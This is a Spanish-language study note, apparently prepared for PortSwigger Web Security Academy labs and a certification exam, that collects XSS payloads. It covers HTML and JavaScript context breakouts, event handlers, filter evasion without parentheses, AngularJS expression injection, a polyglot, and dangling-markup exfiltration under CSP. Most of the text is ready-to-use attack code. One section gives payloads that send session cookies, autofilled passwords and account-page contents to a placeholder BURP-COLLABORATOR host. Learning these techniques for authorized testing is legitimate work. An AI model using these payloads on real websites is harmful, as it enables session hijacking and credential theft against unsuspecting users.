---
aliases:
  - XSS cheat sheet
  - Cross-Site Scripting cheat sheet
  - xss-cheatsheet
tags:
  - vuln/xss
  - cheatsheet
  - reference
---

# XSS — Cheat Sheet

> 🔗 **Referencia directa (oficial):** <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
> La oficial es una **herramienta interactiva** con la lista completa de tags/event handlers filtrable por navegador y contexto (útil para **fuzzear con Intruder** qué pasa un filtro). Abrila en el navegador para copiar vectores masivos.
> Esta nota **cura** los vectores de mayor valor para el examen. Volver al punto de entrada: [README.md](README.md) · Labs: [labs/README.md](labs/README.md)

> [!note] 🟡 Cómo leer el resaltado
> Lo que está <mark>resaltado</mark> es lo que **reemplazás vos**: tu subdominio de Collaborator (`BURP-COLLABORATOR`), el tag/evento que descubriste que pasa el filtro, o tu payload final.

## Vectores base (contexto HTML)

<table>
<tr><th>Vector</th><th>Nota</th></tr>
<tr><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>El clásico; NO funciona vía <code>innerHTML</code>.</td></tr>
<tr><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>El más versátil; funciona en <code>innerHTML</code>.</td></tr>
<tr><td><code>&lt;svg onload=alert(1)&gt;</code></td><td>Corto, dispara solo.</td></tr>
<tr><td><code>&lt;body onload=alert(1)&gt;</code></td><td>Requiere reemplazar/entrar como body.</td></tr>
<tr><td><code>&lt;iframe src=javascript:alert(1)&gt;</code></td><td>Protocolo javascript en src.</td></tr>
<tr><td><code>&lt;xss id=x onfocus=alert(1) tabindex=1&gt;&lt;/xss&gt;</code> + <code>#x</code></td><td>Custom tag cuando bloquean los estándar (autofocus por fragmento).</td></tr>
<tr><td><code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</code></td><td>Cuando solo dejan pasar algo de SVG.</td></tr>
</table>

## Breakout por contexto

<table>
<tr><th>Contexto</th><th>Payload</th></tr>
<tr><td>Atributo <code>value="AQUÍ"</code></td><td><code>"&gt;&lt;svg onload=alert(1)&gt;</code></td></tr>
<tr><td>Atributo con <code>&lt;&gt;</code> filtrados</td><td><code>" autofocus onfocus="alert(1)</code>　·　<code>" onmouseover="alert(1)</code></td></tr>
<tr><td>String JS <code>'AQUÍ'</code></td><td><code>'-alert(1)-'</code>　·　<code>';alert(1)//</code></td></tr>
<tr><td>String JS, comillas escapadas, <code>&lt;/script&gt;</code> permitido</td><td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
<tr><td>String JS, <code>'</code> escapada pero <code>\</code> NO filtrado</td><td><code>\'-alert(1)//</code></td></tr>
<tr><td>Template literal <code>`AQUÍ`</code></td><td><code>${alert(1)}</code></td></tr>
<tr><td>Dentro de <code>&lt;select&gt;</code>/<code>&lt;title&gt;</code>/<code>&lt;textarea&gt;</code></td><td><code>&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></td></tr>
<tr><td><code>href</code>/<code>src</code>/jQuery <code>attr('href')</code></td><td><code>javascript:alert(1)</code></td></tr>
<tr><td>Handler <code>onclick="…AQUÍ…"</code> con entidades decodificadas</td><td><code>&amp;apos;-alert(1)-&amp;apos;</code></td></tr>
</table>

## Event handlers útiles

> La oficial los divide en **con** / **sin interacción**. Los más usados en labs:

<table>
<tr><th>Handler</th><th>Cuándo dispara</th></tr>
<tr><td><code>onerror</code></td><td><code>&lt;img src=x onerror=…&gt;</code> — recurso que falla. El más fiable.</td></tr>
<tr><td><code>onload</code></td><td><code>&lt;svg onload=…&gt;</code>, <code>&lt;body onload=…&gt;</code>, <code>&lt;iframe onload=…&gt;</code>.</td></tr>
<tr><td><code>onfocus</code> + <code>autofocus</code></td><td>Dispara solo al cargar; en atributo cuando no hay <code>&lt;&gt;</code>.</td></tr>
<tr><td><code>onbegin</code></td><td>SVG <code>&lt;animate&gt;</code>/<code>&lt;animatetransform&gt;</code>, dispara solo.</td></tr>
<tr><td><code>onclick</code> / <code>onmouseover</code></td><td>Requieren interacción del usuario (o <code>accesskey</code>).</td></tr>
<tr><td><code>onhashchange</code></td><td>Cambia el fragmento <code>#</code> (entrega por iframe).</td></tr>
</table>

## Ejecutar sin `()` / con filtros

> Detalle completo (backticks, `throw`+`onerror`, `\xNN`, base64…) en → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]].

<pre><code>onerror=alert;throw 1
&lt;img src=x onerror=alert`1`&gt;
window.onerror=eval;throw'=alert\x281\x29';
setTimeout`alert\x281\x29`
location='javascript:alert%281%29'</code></pre>

## Frameworks — AngularJS

Cuando hay `ng-app` y filtran `<>`/`"`, inyectás una **expresión** (no HTML):

<pre><code>{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}</code></pre>

## Payloads de explotación (PoC → real)

<table>
<tr><th>Objetivo</th><th>Payload</th></tr>
<tr><td>Robar cookie</td><td><code>&lt;script&gt;fetch('https://<mark>BURP-COLLABORATOR</mark>/?c='+document.cookie)&lt;/script&gt;</code></td></tr>
<tr><td>Robar cookie (img, más discreto)</td><td><code>&lt;script&gt;new Image().src='https://<mark>BURP-COLLABORATOR</mark>/?c='+document.cookie&lt;/script&gt;</code></td></tr>
<tr><td>Capturar credenciales (autofill)</td><td><code>&lt;input name=username&gt;&lt;input type=password onchange="fetch('https://<mark>BURP-COLLABORATOR</mark>',{method:'POST',body:this.value})"&gt;</code></td></tr>
<tr><td>Exfiltrar <code>/my-account</code></td><td><code>&lt;script&gt;fetch('/my-account').then(r=&gt;r.text()).then(t=&gt;fetch('https://<mark>BURP-COLLABORATOR</mark>/?d='+btoa(t)))&lt;/script&gt;</code></td></tr>
</table>

## Polyglots

Vectores que ejecutan en **varios contextos a la vez** (útiles para probar rápido dónde hay XSS). Vector clásico de Gareth Heyes / PortSwigger (ver la oficial para la lista completa):

<pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</code></pre>

Corto para atributos/HTML:

<pre><code>"&gt;&lt;svg onload=alert()&gt;</code></pre>

## Scriptless / CSP — dangling markup

Cuando la **CSP** impide ejecutar JS, filtrás datos (p. ej. un CSRF token) con **marcado colgante** que dispara una request a tu servidor con el valor:

<pre><code>&lt;img src='https://<mark>BURP-COLLABORATOR</mark>/?x=</code></pre>

Al no cerrar la comilla/tag, el HTML que sigue (incluido el token) viaja en la URL de esa petición. Combinar con un `<base>` o un click forzado según el lab.

---

> [!tip] Flujo mental
> 1) Canario → **¿dónde cae?** 2) **Contexto** → breakout. 3) ¿**Filtro**? → fuzzear (Intruder + lista oficial) → ofuscar. 4) PoC `alert(1)`/`print()` → **payload real** → entregar a la víctima si es reflected/DOM.
